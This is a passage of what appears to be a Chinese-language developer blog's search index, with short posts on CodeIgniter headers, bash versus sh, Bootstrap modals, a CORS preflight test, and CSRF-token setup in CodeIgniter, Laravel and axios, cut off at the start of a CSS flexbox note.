Manual</a></p>\n<p>所以最後只能用原生PHP抓header方法<br>參照<a href=\"https://kingfff.blogspot.com/2017/05/apache-php-header-server-invalid-characters-underscores.html\" target=\"_blank\" rel=\"noopener\">PHP無法在$_SERVER內取得自訂header</a><br>順利解決</p>\n","categories":["Codeigiter"],"tags":["CI"]},{"title":"Bash 和 sh 是不一樣的東西","url":"/blog/2019/10/18/Bash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/","content":"<p>最近使用 sh xxx.sh 出現這個錯誤<code>[[: not found</code><br>奇怪，我看語法正確怎麼會有問題<br>原來發現 sh 跟 bash 是不一樣</p>\n<p>改用 bash xxx.sh 就能正常了</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>sh只是一個符號鏈接，最終指向是一個叫做dash的程序，自Ubuntu 6.10以後，系統的默認shell /bin/sh被改成了dash。dash(the Debian Almquist shell) 是一個比bash小很多但仍兼容POSIX標準的shell，它佔用的磁盤空間更少，執行shell腳本比bash更快，依賴的庫文件更少，當然，在功能上無法與bash相比。dash來自於NetBSD版本的Almquist Shell(ash)。<br>Ubuntu中將默認shell改為dash的主要原因是效率。由於Ubuntu啟動過程中需要啟動大量的shell腳本，為了優化啟動速度和資源使用情況，Ubuntu做了這樣的改動。<br>————————————————<br>版权声明：本文为CSDN博主「小猫的嵌入式」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/lucykingljj/article/details/48519069\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/lucykingljj/article/details/48519069</a></p>\n</blockquote>\n<p>sh 沒有對應 2 個中誇號，所以才會報錯</p>\n<h2 id=\"最佳執行-sh-執行方法\"><a href=\"#最佳執行-sh-執行方法\" class=\"headerlink\" title=\"最佳執行 .sh 執行方法\"></a>最佳執行 .sh 執行方法</h2><p>只要 xxx.sh 上面有放<code>#! /bin/sh</code><br>我們只要<code>./xxx.sh</code>就能順利執行了</p>\n<p>就這們簡單!!!!</p>\n<p>參考連結:</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/lucykingljj/article/details/48519069\" target=\"_blank\" rel=\"noopener\">Linux shell腳本執行提示錯誤[[: not found - lucykingljj的專欄 - CSDN博客</a></li>\n<li><a href=\"http://it.chinawin.net/os/article-8112.html\" target=\"_blank\" rel=\"noopener\">it.chinawin.net/os/article-8112.html</a></li>\n<li><a href=\"https://blog.csdn.net/ziyoudeyun1993/article/details/65627518\" target=\"_blank\" rel=\"noopener\">#!/usr/bin/env bash和#!/bin/bash区别 - 小硕成长空间 - CSDN博客</a><br>下面怕沒有時間寫，先預留連結</li>\n<li><a href=\"https://stackoverflow.com/questions/35274597/store-mysql-result-in-a-bash-array-variable\" target=\"_blank\" rel=\"noopener\">Store mysql result in a bash array variable - Stack Overflow</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/446748/how-do-i-capture-a-mysql-result-set-in-a-bash-array\" target=\"_blank\" rel=\"noopener\">shell script - How do I capture a MySQL result set in a bash array? - Unix &amp; Linux Stack Exchange</a></li>\n<li><a href=\"https://www.journaldev.com/821/generate-xml-xsd-eclipse-java\" target=\"_blank\" rel=\"noopener\">How to Generate XML from XSD in Eclipse - JournalDev</a></li>\n<li><a href=\"https://www.jetbrains.com/help/phpstorm/generating-instance-document-from-xml-schema.html\" target=\"_blank\" rel=\"noopener\">Generating Instance Documents From XML Schemas - Help | PhpStorm</a></li>\n</ul>\n","categories":["Linux"],"tags":["bash","sh"]},{"title":"Bootstrap 不知道Modal一些事筆記","url":"/blog/2019/02/19/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/","content":"<p>說真的平常只用 Boostrap 基本東西<br>很少深入研究這個東西<br>今天看到一段程式<br>感覺 Bootstrap 值得深入研究</p>\n<a id=\"more\"></a>\n<h2 id=\"remote-v4-以廢棄\"><a href=\"#remote-v4-以廢棄\" class=\"headerlink\" title=\"remote (v4 以廢棄)\"></a>remote (v4 以廢棄)</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">data-toggle</span>=<span class=\"string\">\"modal\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"remote.html\"</span> <span class=\"attr\">data-target</span>=<span class=\"string\">\"#modal\"</span>&gt;</span>Click me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以呼叫<code>remote.html</code>到<code>#modal</code>裡面去<br>沒錯我當初看到的時候<br>覺得很神奇<br>跑去官網文件都沒有找到<br>結果查看了一下 v3</p>\n<blockquote>\n<p>This option is deprecated since v3.3.0 and has been removed in v4. We recommend instead using client-side templating or a data binding framework, or calling jQuery.load yourself</p>\n</blockquote>\n<p>這麼好用的功能…，怎麼要廢棄掉???<br><a href=\"https://stackoverflow.com/questions/18378720/bootstrap-3-with-remote-modal\" target=\"_blank\" rel=\"noopener\">Bootstrap 3 with remote Modal - Stack Overflow</a><br>所以之後可能需要用 jQuery.load 手動載入方式</p>\n<h3 id=\"神奇清除-remote-表單\"><a href=\"#神奇清除-remote-表單\" class=\"headerlink\" title=\"神奇清除 remote 表單\"></a>神奇清除 remote 表單</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#myModal\"</span>).on(<span class=\"string\">\"hidden.bs.modal\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  $(<span class=\"keyword\">this</span>).removeData(<span class=\"string\">\"bs.modal\"</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://plnkr.co/edit/HWSgSw?p=preview\" target=\"_blank\" rel=\"noopener\">Plunker</a><br>其實仔細觀察，開發者工具看，他會重新載入網頁<br>所以值都是一開始的樣子</p>\n<p>有時候還會失敗，最好的方式就是</p>\n<p>不過這個方法，只能適用在 remote<br>所以網路上只看到 v2,v3<br>但沒有看到 v4</p>\n<h2 id=\"修改表單小技巧\"><a href=\"#修改表單小技巧\" class=\"headerlink\" title=\"修改表單小技巧\"></a>修改表單小技巧</h2><p><a href=\"https://getbootstrap.com/docs/4.3/components/modal/\" target=\"_blank\" rel=\"noopener\">Modal · Bootstrap</a></p>\n<p>平常我們重開 modal，打開兩次，第一次修改，直接取消，第二次打開後可能是第一次修改取消的值<br>原本 remote 方式可以輕鬆解決<br>但是網路上有找到用<code>data-*</code>方式去紀錄</p>\n<p><a href=\"https://codepen.io/mkrl/pen/ZmWVMJ\" target=\"_blank\" rel=\"noopener\">Correct approach of getting dynamic values from data-attributes with jQuery</a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">id</span>=<span class=\"string\">\"btn1\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">data-toggle</span>=<span class=\"string\">\"modal\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">data-target</span>=<span class=\"string\">\"#exampleModal\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">data-title</span>=<span class=\"string\">\"Post 1\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  Edit</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">class</span>=<span class=\"string\">\"modal fade\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">id</span>=<span class=\"string\">\"exampleModal\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">tabindex</span>=<span class=\"string\">\"-1\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">role</span>=<span class=\"string\">\"dialog\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">aria-labelledby</span>=<span class=\"string\">\"exampleModalLabel\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-dialog\"</span> <span class=\"attr\">role</span>=<span class=\"string\">\"document\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-content\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-header\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h5</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-title\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"exampleModalLabel\"</span>&gt;</span>New message<span class=\"tag\">&lt;/<span class=\"name\">h5</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">class</span>=<span class=\"string\">\"close\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">data-dismiss</span>=<span class=\"string\">\"modal\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">aria-label</span>=<span class=\"string\">\"Close\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span>&gt;</span>&amp;times;<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-body\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-group\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"title\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"col-form-label\"</span>&gt;</span>Title:<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"title\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"title\"</span> /&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"modal-footer\"</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-secondary\"</span> <span class=\"attr\">data-dismiss</span>=<span class=\"string\">\"modal\"</span>&gt;</span></span><br><span class=\"line\">            Close</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">button</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">onClick</span>=<span class=\"string\">\"edit(this.form)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          &gt;</span></span><br><span class=\"line\">            Submit</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#exampleModal\"</span>).on(<span class=\"string\">\"show.bs.modal\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> button = $(event.relatedTarget);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> recipient = button.attr(<span class=\"string\">\"data-title\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> modal = $(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  modal.find(<span class=\"string\">\".modal-body input#title\"</span>).val(recipient);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">edit</span>(<span class=\"params\">form</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> title = form.title.value;</span><br><span class=\"line\">  <span class=\"comment\">////// insert into database</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> btn1 = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"btn1\"</span>);</span><br><span class=\"line\">  btn1.setAttribute(<span class=\"string\">\"data-title\"</span>, form.title.value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但 Modal 還不只這樣<br>有空深入研究在寫</p>\n"},{"title":"CORS實作可能要注意的事情","url":"/blog/2019/03/07/CORS%E5%AF%A6%E4%BD%9C%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>雖然平常沒有使用 CORS<br>但是之前有嘗試了解 CORS 流程原理<br>其實瀏覽器會先送 OPTIONS 封包做確認<br>有做跨域 header 東西，就會傳送資訊<br>今天突然想到傳送兩次<br>不是會做兩次程式東西<br>我稍微爬了一下文章<br>原來我想的問題真的是有這個問題</p>\n<a id=\"more\"></a>\n<p>看到這篇<a href=\"https://zhuanlan.zhihu.com/p/29980092\" target=\"_blank\" rel=\"noopener\">CORS 跨域原理浅析 - 知乎</a> <a href=\"/blog/2019/03/07/CORS實作可能要注意的事情/web.png\" title=\"備份圖\">備份圖</a><br>裡面有提到很多很細的內容<br>我自己也有用簡單 PHP 測試</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Origin: *\"</span>);</span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Headers: *\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'work!'</span> . PHP_EOL;</span><br><span class=\"line\">$fp = fopen(<span class=\"string\">'test.txt'</span>,<span class=\"string\">'a+'</span>);</span><br><span class=\"line\">fwrite($fp,<span class=\"string\">'1'</span>. PHP_EOL);</span><br><span class=\"line\">fclose($fp);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'finial'</span> . PHP_EOL;</span><br></pre></td></tr></table></figure>\n<p>簡單用<code>php -s 0.0.0.0:8888</code>就可以啟動 php 簡易 server<br>在隨便網頁開啟開發者工具，可以<code>fetch(&#39;http://localhost:8888/test.php&#39;)</code><br>可以看<code>test.txt</code>有幾個 1<br>就知道執行幾次</p>\n<p>雖然平常沒甚麼機會使用 CORS，但是還是紀錄這個容易忽略的事情<br>話說 Laravel 好像也要注意怎麼修改</p>\n<p>相關連結:</p>\n<ul>\n<li><a href=\"https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/\" target=\"_blank\" rel=\"noopener\">輕鬆理解 Ajax 與跨來源請求 | TechBridge 技術共筆部落格</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/29980092\" target=\"_blank\" rel=\"noopener\">CORS 跨域原理浅析 - 知乎</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33542992\" target=\"_blank\" rel=\"noopener\">Laravel 处理 OPTIONS 请求的原理探索及 \b 批量处理方案 - 知乎</a></li>\n<li><a href=\"https://adon988.logdown.com/posts/7816040-cross-domain-cros-request-issues\" target=\"_blank\" rel=\"noopener\">PHP, Larave, Nginx 設置 Header 允許請求 CORS 的幾種方式 « 關於網路那些事…</a></li>\n</ul>\n","categories":["JavaScript"],"tags":["cors","ajax"]},{"title":"CSRF , SSRF , XSS 有關網頁安全小記","url":"/blog/2019/05/26/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/","content":"<p>最近看到相關網頁安全東西<br>XSS,CSRF 我也比較長看到<br>但是 SSRF 就沒什麼聽過<br>筆記筆記</p>\n<a id=\"more\"></a>\n<p>找到資訊</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/28657325\" target=\"_blank\" rel=\"noopener\">【庖丁解牛】CSRF 和 SSRF，是如何攻防？ - 知乎</a></li>\n<li><a href=\"https://blog.csdn.net/sdb5858874/article/details/80896784\" target=\"_blank\" rel=\"noopener\">XSS,CSRF,SSRF 三种漏洞的区别和共同点 - 18 年 3 月萌新白帽子 - CSDN 博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/2f60dbd68eb8\" target=\"_blank\" rel=\"noopener\">csrf 以及 ssrf - 简书</a></li>\n<li><p><a href=\"https://ctf-wiki.github.io/ctf-wiki/web/ssrf/\" target=\"_blank\" rel=\"noopener\">SSRF 服务端请求伪造 - CTF Wiki</a></p>\n<p>傳接 API 需不需要加入 CSRF 判斷<br>所以查了一篇<br>好像也沒有一定答案<br>但有說串接 API 需要帶 Key</p>\n</li>\n<li><p><a href=\"https://ruby-china.org/topics/32166\" target=\"_blank\" rel=\"noopener\">请教大家 app 接口需要防护 csrf 吗？ · Ruby China</a></p>\n</li>\n</ul>\n<p>無相關小記</p>\n<ul>\n<li><a href=\"https://juejin.im/post/5b17de31f265da6e397b70f4\" target=\"_blank\" rel=\"noopener\">WWDC 中提到的浏览器 Fingerprinting 有多可怕？ - 掘金</a></li>\n<li><a href=\"https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/165196/\" target=\"_blank\" rel=\"noopener\">資料庫讀寫分離架構實踐 | 程式前沿</a></li>\n</ul>\n<p>有時間找到再補充</p>\n<p><strong>2019-07-01</strong></p>\n<p>最近用 CI 做 CSRF<br>在頁面 form 和 ajax 做 CSRF<br>PS: <code>$config[&#39;csrf_protection&#39;] = TRUE;</code> 設定<br>方法是用<code>data: {&#39;&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name(); ?&gt;&#39;:&#39;&lt;?php echo $this-&gt;security-&gt;get_csrf_hash(); ?&gt;&#39;</code><br>但在 SPA 做 CSRF 就會遇到 token 過期<br>因為 CSRF token 只能用一次<br>這個一不小心就踩到的問題</p>\n<p><a href=\"http://blog.twbryce.com/codeigniter-%E4%BD%BF%E7%94%A8csrf-token/\" target=\"_blank\" rel=\"noopener\">codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce’S Note</a><br>網路找幾個方案</p>\n<ol>\n<li>Cookies 來抓 CSRF，因為 CSRF 是從 cookies 那邊設定</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  $(<span class=\"string\">\"#btn\"</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    $.ajax(&#123;</span><br><span class=\"line\">      type: <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">      url: <span class=\"string\">\"/ajax\"</span>, <span class=\"comment\">//ajax接收的server端</span></span><br><span class=\"line\">      data:</span><br><span class=\"line\">        $(<span class=\"string\">\"#form\"</span>).serialize() +</span><br><span class=\"line\">        <span class=\"string\">\"&amp;csrf_test_name=\"</span> +</span><br><span class=\"line\">        getCookie(<span class=\"string\">\"csrf_test_name\"</span>),</span><br><span class=\"line\">      success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">        alert(data.msg);</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      dataType: <span class=\"string\">\"json\"</span></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCookie</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> arr = <span class=\"built_in\">document</span>.cookie.match(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"(^| )\"</span> + name + <span class=\"string\">\"=([^;]*)(;|$)\"</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr != <span class=\"literal\">null</span>) <span class=\"keyword\">return</span> <span class=\"built_in\">unescape</span>(arr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.hsin.tw/2011/codeigniter-csrf-protection-form-ajax/\" target=\"_blank\" rel=\"noopener\">Codeigniter 開啟 csrf protection 時 傳送表單(or ajax) | [lifeIs: tooShort to: waste]</a></p>\n<h3 id=\"Laravel-AJAX-解法\"><a href=\"#Laravel-AJAX-解法\" class=\"headerlink\" title=\"Laravel AJAX 解法\"></a>Laravel AJAX 解法</h3><p>先說說一般用法<br><code>@csrf</code></p>\n<p>1.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.ajaxSetup(&#123;</span><br><span class=\"line\">  headers: &#123; <span class=\"string\">\"X-CSRF-TOKEN\"</span>: <span class=\"string\">\"&#123;&#123; csrf_token() &#125;&#125;\"</span> &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>2.</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"_token\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"&#123;&#123; csrf_token() &#125;&#125;\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>再用 js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.ajaxSetup(&#123;</span><br><span class=\"line\">   headers: &#123;</span><br><span class=\"line\">       &apos;X-CSRF-TOKEN&apos;: $(&apos;meta[name=&quot;_token&quot;]&apos;).attr(&apos;content&apos;)</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>從 cookie 那邊得來 CSRF，跟上面 CI 方法很像，異曲同工之妙。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.ajaxSetup(&#123;</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"X-XSRF-TOKEN\"</span>: $.cookie(<span class=\"string\">\"XSRF-TOKEN\"</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>我同事有找到一篇，先打 ajax 取 csrf，在發送表單…<br>不過我們都覺得不優 XD</p>\n<p>PS: Laravel 會把 CSRF 寫在 XSRF-TOKEN</p>\n<p><a href=\"https://blog.huli.tw/2017/03/12/csrf-introduction/\" target=\"_blank\" rel=\"noopener\">讓我們來談談 CSRF - Huli’s blog</a> <a href=\"/blog/2019/05/26/CSRF-SSRF-XSS有關網頁安全小記/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://eyehere.net/2015/laravel-ajax-csrf/\" target=\"_blank\" rel=\"noopener\">Laravel 中 Ajax 调用时的 CSRF 对策 – 目光博客</a><br><a href=\"https://learnku.com/docs/laravel/5.5/csrf/1295\" target=\"_blank\" rel=\"noopener\">CSRF 保护 |《Laravel 5.5 中文文档》| Laravel China 社区</a><br><a href=\"http://blog.twbryce.com/codeigniter-%E4%BD%BF%E7%94%A8csrf-token/\" target=\"_blank\" rel=\"noopener\">codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce’S Note</a></p>\n<h2 id=\"AXIOS-搭配用-Laravel-AJAX-免設定\"><a href=\"#AXIOS-搭配用-Laravel-AJAX-免設定\" class=\"headerlink\" title=\"AXIOS 搭配用 Laravel AJAX 免設定\"></a>AXIOS 搭配用 Laravel AJAX 免設定</h2><p><a href=\"https://github.com/axios/axios\" target=\"_blank\" rel=\"noopener\">axios/axios: Promise based HTTP client for the browser and node.js</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> // `xsrfCookieName` is the name of the cookie to use as a value for xsrf token</span><br><span class=\"line\">xsrfCookieName: &apos;XSRF-TOKEN&apos;, // default</span><br><span class=\"line\">// `xsrfHeaderName` is the name of the http header that carries the xsrf token value</span><br><span class=\"line\">xsrfHeaderName: &apos;X-XSRF-TOKEN&apos;, // default</span><br></pre></td></tr></table></figure>\n<p>設定 axios，可以不需要設定 CSRF<br>前端套件幫你處理了 XD</p>\n<p>我覺得有空來實作看看</p>\n<p><strong>2019-07-05</strong></p>\n<p>今天看到</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/31715835\" target=\"_blank\" rel=\"noopener\">IE 的一个通用 Cookie 跨域漏洞 - 知乎</a></li>\n<li><a href=\"https://github.com/aszx87410/blog/issues/16\" target=\"_blank\" rel=\"noopener\">讓我們來談談 CSRF · Issue #16 · aszx87410/blog</a></li>\n<li><a href=\"https://github.com/twtrubiks/CSRF-tutorial\" target=\"_blank\" rel=\"noopener\">twtrubiks/CSRF-tutorial: Use Django To Introduce CSRF and Cookies , Session 📝</a></li>\n</ul>\n<p>講到</p>\n<ul>\n<li>Synchronizer Token Pattern ( STP )</li>\n<li>Double Submit Cookie</li>\n</ul>\n<blockquote>\n<p>其中的”某些 CSRF 防禦”特指 Double Cookie Submit。（雙 Cookie 遞交認證，指的是在 GET 參數及 HTTP 請求中同時包含一個隨機的字符串，如果服務器判斷 GET 參數和 Cookie 參數相等，那麼沒有受到 CSRF 攻擊）由於這是 OWASP 欽定的防禦方法，人們往往會忽略 IE Cookie 漏洞對其的繞過。<br><a href=\"https://zhuanlan.zhihu.com/p/31715835\" target=\"_blank\" rel=\"noopener\">IE 的一個通用 Cookie 跨域漏洞 - 知乎</a></p>\n</blockquote>\n<p>這個寫得很清楚是什麼意思</p>\n<p>我覺寫得不錯!!</p>\n","categories":["程式心法"],"tags":["CSRF","SSRF","XSS"]},{"title":"CSS flex常忘記筆記","url":"/blog/2018/06/08/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/","content":"<h2 id=\"flex-direction-column-column-reverse-row-row-reverse-預設row\"><a href=\"#flex-direction-column-column-reverse-row-row-reverse-預設row\" class=\"headerlink\" title=\"flex-direction:  column/column-reverse row row-reverse (預設row)\"></a>flex-direction:  column/column-reverse row row-reverse (預設row)</h2><h2 id=\"flex-wrap-wrap-nowrap-wrap-reverse-default-nowrap\"><a href=\"#flex-wrap-wrap-nowrap-wrap-reverse-default-nowrap\" class=\"headerlink\" title=\"flex-wrap: wrap nowrap wrap-reverse (default: nowrap)\"></a>flex-wrap: wrap nowrap wrap-reverse (default: nowrap)</h2><p>常忘記有<strong>wrap-reverse</strong><br><a href=\"https://flexboxfroggy.com/\" target=\"_blank\" rel=\"noopener\">Flexbox Froggy - A game for learning CSS flexbox</a><br>最後一關會用到他(我卡很久在那邊)</p>\n<a id=\"more\"></a>\n<h2 